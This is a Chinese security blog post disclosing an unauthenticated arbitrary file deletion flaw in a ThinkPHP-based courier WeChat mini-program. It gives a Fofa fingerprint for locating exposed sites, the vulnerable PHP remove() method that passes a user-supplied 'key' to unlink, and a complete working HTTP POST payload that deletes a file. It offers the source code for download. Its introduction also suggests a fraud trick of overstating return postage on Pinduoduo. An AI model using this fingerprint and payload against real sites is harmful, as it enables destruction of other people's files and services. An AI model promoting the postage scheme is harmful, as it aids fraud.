#  (1day)某最新版快递微信小程序系统存在前台任意文件删除漏洞   
原创 Mstir  星悦安全   2024-11-02 12:26  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 系统简介  
  
**源码站简介:2024最新版快递跑腿微信小程序，支持 查快递，查运费，分享佣金，修改地址，个人中心等功能，现在电商平台退换货量大，快递需求量大，对接物流一个单子4块到6块之间 其中间是例如润 其余的 就不说了吧 互站上买的源码 分享一下 还有个方法赚钱就是 拼多多退货自己邮寄 5块钱 运费自己填写12元 白捡7元美滋滋.**  
  
**Fofa指纹:"/static/default/newwap/lang/js/jquery.localize.min.js"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dic3NsXqD6rYxfszKo3AqUrtHADGxl3mz5kAm8OzmL2Y5eYjBOqdu12TauJCkqAU5vwnj2PuUGITg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dic3NsXqD6rYxfszKo3AqUrUcjnR9ZAFaeZUx08R5RFia9xlSGJcQ6XPmU8FkiciaL47Nkwm7Eib8zvMw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dic3NsXqD6rYxfszKo3AqUrJiaKG2kZaubll7KJqzIHXTuQP0RXgZRER2EAkT11J9s7ZVKgUENTvvA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**框架:ThinkPHP 5.1.0 Debug:True**  
## 0x01 漏洞分析&复现  
  
**位于 /public/qiniu_ueditor/php/vendor/Local.class.php 控制器的 remove 方法存在unlink函数，且传参可控，导致漏洞产生.**  
```
/**
* 删除文件方法
* 
* @author widuu <admin@widuu.com>
*/

public function remove(){
  $file = trim($_POST['key']);
  $config    = $this->config;
  $root_path = $config['root_path'];
  $file_path = $root_path.$file;
  if( file_exists($file_path) ){
    $result = @unlink($file_path);
    if( $result ){
      return array(
        'state' => 'SUCCESS'
      );
    }else{
      return array(
        'state' => 'ERROR',
        'error' => 'delete file error'
      );
    }
  }

  return array(
    'state' => 'ERROR',
    'error' => 'file not exists'
  );
}
```  
  
**Payload (删除根目录中的1.png文件):**  
```
POST /public/qiniu_ueditor/php/controller.php?action=remove HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 13
Content-Type: application/x-www-form-urlencoded
Cookie: think_var=zh-cn; PHPSESSID=5cg6kramfusrb94homfj2q7ku1; thinkphp_show_page_trace=0|0; admin=think%3A%7B%22admin_id%22%3A%221%22%2C%22type%22%3A%221%22%2C%22user_id%22%3A%221%22%2C%22username%22%3A%22admin%22%2C%22password%22%3A%2221232f297a57a5a743894a0e4a801fc3%22%2C%22role_id%22%3A%221%22%2C%22city_id%22%3A0%2C%22area_id%22%3A0%2C%22business_id%22%3A0%2C%22mobile%22%3A%2218888888888%22%2C%22lock_admin_mum%22%3A0%2C%22is_lock%22%3A%221%22%2C%22is_admin_lock%22%3A0%2C%22is_admin_lock_time%22%3A0%2C%22create_time%22%3A%221497679379%22%2C%22create_ip%22%3A%2227.13.26.84%22%2C%22last_time%22%3A%221603174799%22%2C%22last_ip%22%3A%2249.118.246.1%22%2C%22is_ip%22%3A0%2C%22is_username_lock%22%3A0%2C%22closed%22%3A0%2C%22role_name%22%3A%22%25E5%2585%25AC%25E5%258F%25B8%25E6%2580%25BB%25E9%2583%25A8%22%7D
Host: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/public/qiniu_ueditor/php/controller.php?action=remove
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

key=./1.png
```  
  
****![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5e5Iib8qJwofo7iaNeic6vMsr2NgkbkjU02BzHOs7NWk4eDzylokEanCNgKbxrF9NEBVlGJk50l1zuhA/640?wx_fmt=other&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**快递小程序源码关注公众号发送 241031 获取!**  
  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
